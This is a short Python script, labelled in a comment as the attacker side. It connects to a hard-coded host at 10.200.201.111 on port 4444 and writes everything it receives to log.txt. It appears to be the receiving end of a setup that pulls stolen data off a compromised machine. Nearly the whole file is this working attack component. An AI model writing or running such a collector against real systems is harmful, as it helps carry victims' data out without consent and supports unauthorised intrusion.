import socket, sys, threading

from time import sleep

host, port = '10.200.201.111', 4444


# This class describe the attacker side
class recv_data:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.connect((host, port))

    def __init__(self):
        data = self.mysocket.recv(1024)
        f = open('log.txt', 'wb')
        while data != bytes(''.encode()):
            f.write(data)
            data = self.mysocket.recv(1024)


re = recv_data()
